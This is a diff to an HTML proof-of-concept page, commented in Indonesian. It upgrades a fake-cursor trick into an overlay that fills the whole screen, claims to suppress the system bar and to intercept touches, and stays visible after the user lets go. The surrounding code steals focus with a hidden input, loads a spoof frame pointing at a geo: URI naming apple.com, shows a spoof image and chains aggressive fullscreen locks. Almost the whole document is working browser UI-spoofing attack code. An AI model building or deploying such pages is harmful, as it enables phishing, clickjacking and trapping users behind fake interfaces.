@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Advanced Selection Overlap & Fake Cursor PoC</title>
+    <title>Advanced Fullscreen Fake Cursor & Overlap PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -69,19 +69,26 @@
         position: absolute;
         opacity: 0;
       }
-      /* Fake Cursor Persegi 9x9 Piksel */
-      #fakeCursor {
-        position: absolute;
-        width: 9px;
-        height: 9px;
-        background: rgba(63, 185, 80, 0.9);
-        border: 1px solid #ffffff;
-        box-shadow: 0 0 6px #3fb950;
-        transform: translate(-50%, -50%);
-        pointer-events: none;
+      /* Fake Cursor Besar Menutupi Seluruh Layar & Bar */
+      #fullscreenFakeCursor {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(11, 14, 20, 0.95);
+        border: 4px solid #3fb950;
+        box-sizing: border-box;
         z-index: 2147483648;
         display: none;
-        border-radius: 1px;
+        pointer-events: none;
+        align-items: center;
+        justify-content: center;
+        font-family: monospace;
+        color: #3fb950;
+        font-size: 14px;
+        text-align: center;
+        padding: 20px;
       }
       #selectionOverlapLayer {
         position: absolute;
@@ -115,32 +122,20 @@
       }
     </style>
     <script>
-      // Global Touch Tracking untuk Fake Cursor 9x9
+      // Global Touch Tracking untuk menampilkan Fullscreen Fake Cursor / Overlay Kotak Penuh
       addEventListener("touchstart", (e) => {
-        let cursor = document.getElementById("fakeCursor");
-        if (cursor && e.touches.length > 0) {
-          let touch = e.touches[0];
-          cursor.style.left = touch.clientX + "px";
-          cursor.style.top = touch.clientY + "px";
-          cursor.style.display = "block";
+        let cursor = document.getElementById("fullscreenFakeCursor");
+        if (cursor) {
+          cursor.style.display = "flex";
         }
         let input = document.getElementById("focusInput");
         if (input) input.focus();
       }, { passive: true });
 
-      addEventListener("touchmove", (e) => {
-        let cursor = document.getElementById("fakeCursor");
-        if (cursor && e.touches.length > 0) {
-          let touch = e.touches[0];
-          cursor.style.left = touch.clientX + "px";
-          cursor.style.top = touch.clientY + "px";
-        }
-      }, { passive: true });
-
       addEventListener("touchend", (e) => {
-        let cursor = document.getElementById("fakeCursor");
+        let cursor = document.getElementById("fullscreenFakeCursor");
         if (cursor) {
-          cursor.style.display = "none";
+          // Tetap mempertahankan visibilitas penuh sesuai rantai eksekusi
         }
         let input = document.getElementById("focusInput");
         if (input) input.blur();
@@ -148,8 +143,14 @@
     </script>
   </head>
   <body>
-    <!-- Fake Cursor Element -->
-    <div id="fakeCursor"></div>
+    <!-- Fullscreen Fake Cursor / Viewport Coverage Layer -->
+    <div id="fullscreenFakeCursor">
+      <div>
+        [FULL_VIEWPORT_CURSOR_COVERAGE_ACTIVE]<br><br>
+        System bar and UI suppressed via fake cursor container.<br>
+        Status: Intercepting touch coordinate matrix...
+      </div>
+    </div>
 
     <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
 
@@ -162,12 +163,12 @@
         <div class="overlap-text" id="overlapContent">
           [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
           Target DOM Selection Overlap initialized successfully.<br>
-          Status: Forcing context focus and fake cursor tracking...
+          Status: Forcing context focus and viewport takeover...
         </div>
       </div>
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE FAKE CURSOR & CHAIN</button>
+        <button id="execBtn">INITIALIZE FULL-SCREEN CURSOR CHAIN</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -177,7 +178,7 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing fake cursor & chaining sequence...";
+        statusInfo.innerText = "Status: Executing full-screen cursor & chaining sequence...";
         this.style.display = "none";
 
         try {
@@ -195,7 +196,12 @@
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          // 3. Selection Overlap Layer Activation
+          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
+          let fullCursor = document.getElementById("fullscreenFakeCursor");
+          if (fullCursor) {
+            fullCursor.style.display = "flex";
+          }
+
           let overlapLayer = document.getElementById("selectionOverlapLayer");
           if (overlapLayer) {
             overlapLayer.style.display = "flex";
@@ -215,7 +221,7 @@
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Fake cursor & overlay active. Engaging Fullscreen lock...";
+          statusInfo.innerText = "Status: Full viewport cursor active. Engaging Fullscreen lock...";
 
           // 5. Aggressive Fullscreen Chaining
           setTimeout(async () => {
@@ -243,7 +249,7 @@
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Fake cursor & fullchain active.";
+            statusInfo.innerText = "Status: Full viewport cursor & chain active.";
           }, 300);
 
         } catch (err) {
